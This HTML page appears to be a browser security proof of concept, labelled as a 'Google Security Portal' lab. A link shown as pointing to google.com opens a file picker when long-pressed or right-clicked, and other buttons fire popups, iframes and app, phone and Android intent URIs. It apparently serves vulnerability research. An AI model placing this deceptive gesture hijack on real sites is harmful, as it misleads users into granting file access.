<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Multi-Vector Security PoC with Google Integration</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 20px;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            gap: 10px;
            width: 100%;
            max-width: 320px;
        }
        a.spoof-link, button.spoof-btn {
            display: block;
            color: white;
            padding: 11px 16px;
            text-decoration: none;
            font-weight: 600;
            font-size: 13px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
            transition: opacity 0.2s;
        }
        a.spoof-link:active, button.spoof-btn:active {
            opacity: 0.8;
        }
        .btn-blue { background-color: #1a73e8; }
        .btn-green { background-color: #34a853; }
        .btn-red { background-color: #ea4335; }
        .btn-yellow { background-color: #fbbc05; color: #202124; }
        .btn-purple { background-color: #9334e6; }
        .btn-dark { background-color: #202124; }
        .btn-google { background-color: #ffffff; color: #3c4043; border: 1px solid #dadce0; }

        .preview-container {
            margin-top: 20px;
            max-width: 280px;
            display: none;
        }
        .preview-container img {
            width: 100%;
            border-radius: 8px;
            border: 1px solid #dadce0;
        }
        .file-info {
            margin-top: 8px;
            font-size: 12px;
            color: #5f6368;
            word-break: break-all;
        }
        .embedded-frame-container {
            margin-top: 20px;
            width: 100%;
            max-width: 400px;
            height: 200px;
            display: none;
            border: 1px solid #dadce0;
            border-radius: 8px;
            overflow: hidden;
        }
        .embedded-frame-container iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        .footer-note {
            margin-top: 25px;
            font-size: 11px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal - Embedded Vector Lab</div>
    <h1>Advanced Vector Testing Suite</h1>

    <div class="button-container">
        <!-- 1. File Picker Spoof Vector -->
        <a href="https://google.com" class="spoof-link btn-blue" id="targetLink">1. File Picker & Ephemeral Tab</a>

        <!-- 2. Google Integration Buttons -->
        <button class="spoof-btn btn-google" onclick="openGooglePopup()">2. Open Google.com in New Window/Popup</button>
        <button class="spoof-btn btn-google" onclick="toggleGoogleIframe()">3. Toggle Google.com IFrame Embedding</button>
        <button class="spoof-btn btn-google" onclick="redirectNavToGoogle()">4. Seamless Location Navigation to Google</button>

        <!-- 3. Geo & Custom Protocol Schemes -->
        <button class="spoof-btn btn-green" onclick="triggerGeoHalo()">5. Geo Intent (geo:halo)</button>
        <button class="spoof-btn btn-red" onclick="triggerCustomProtocol('tel:+628123456789')">6. Tel Intent (Phone Dialer)</button>

        <!-- 4. Social & App Intents -->
        <button class="spoof-btn btn-purple" onclick="triggerAppScheme('instagram://app')">7. Instagram App Intent</button>
        <button class="spoof-btn btn-dark" onclick="triggerAndroidIntent('android.settings.BLUETOOTH_SETTINGS')">8. Bluetooth Settings Intent</button>
    </div>

    <!-- Uploaded Image Preview Box -->
    <div class="preview-container" id="previewBox">
        <img id="imagePreview" src="" alt="File Preview">
        <div class="file-info" id="fileInfo"></div>
    </div>

    <!-- Google Frame Container -->
    <div class="embedded-frame-container" id="googleFrameContainer">
        <iframe id="googleIframe" src="" title="Google Embed"></iframe>
    </div>

    <div class="footer-note">Authorized security research environment.</div>

    <script>
        let triggered = false;

        // 1. File Picker Vector Logic
        const executeAttackVector = () => {
            if (triggered) return;
            triggered = true;

            setTimeout(async () => {
                try {
                    const [fileHandle] = await window.showOpenFilePicker({
                        multiple: false,
                        types: [{
                            description: 'Images & Documents',
                            accept: { 
                                'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
                                'application/pdf': ['.pdf']
                            }
                        }]
                    });

                    const file = await fileHandle.getFile();
                    document.getElementById("fileInfo").innerText = `Selected file: ${file.name}`;

                    const previewBox = document.getElementById("previewBox");
                    const imagePreview = document.getElementById("imagePreview");
                    
                    if (file.type.startsWith('image/')) {
                        imagePreview.src = URL.createObjectURL(file);
                        previewBox.style.display = "block";
                    } else {
                        imagePreview.src = "";
                        previewBox.style.display = "block";
                    }

                } catch (err) {
                    console.debug("File picker cancelled or blocked:", err.message);
                } finally {
                    setTimeout(() => { triggered = false; }, 900);
                }
            }, 1300);
        };

        const targetElement = document.getElementById("targetLink");
        targetElement.addEventListener("contextmenu", (e) => {
            e.preventDefault();
            executeAttackVector();
        });
        targetElement.addEventListener("touchstart", () => {}, { passive: true });

        // 2. Google Integration Handler Functions
        function openGooglePopup() {
            // Membuka Google.com sebagai popup window untuk menguji referensi window objek
            const googleWindow = window.open("https://www.google.com", "_blank", "width=600,height=600");
            if (googleWindow) {
                setTimeout(() => {
                    try {
                        // Mencoba berinteraksi dengan window reference jika diizinkan oleh SOP (Same-Origin Policy)
                        console.debug("Popup opened successfully.");
                    } catch (e) {
                        console.debug("Cross-origin restriction applies.");
                    }
                }, 2000);
            }
        }

        function toggleGoogleIframe() {
            const container = document.getElementById("googleFrameContainer");
            const iframe = document.getElementById("googleIframe");
            if (container.style.display === "block") {
                container.style.display = "none";
                iframe.src = "";
            } else {
                // Menyisipkan URL google.com ke dalam iframe (perhatikan bahwa Google menerapkan X-Frame-Options/CSP frame-ancestors)
                iframe.src = "https://www.google.com/search?igu=1"; 
                container.style.display = "block";
            }
        }

        function redirectNavToGoogle() {
            // Mengalihkan halaman utama langsung ke Google
            window.location.href = "https://www.google.com";
        }

        // 3 & 4. Protokol Lainnya
        function triggerGeoHalo() {
            window.location.href = "geo:halo";
        }

        function triggerCustomProtocol(uri) {
            window.location.href = uri;
        }

        function triggerAppScheme(scheme) {
            window.location.href = scheme;
        }

        function triggerAndroidIntent(actionName) {
            const intentUrl = `intent:#Intent;action=${actionName};end;`;
            window.location.href = intentUrl;
        }
    </script>

</body>
</html>
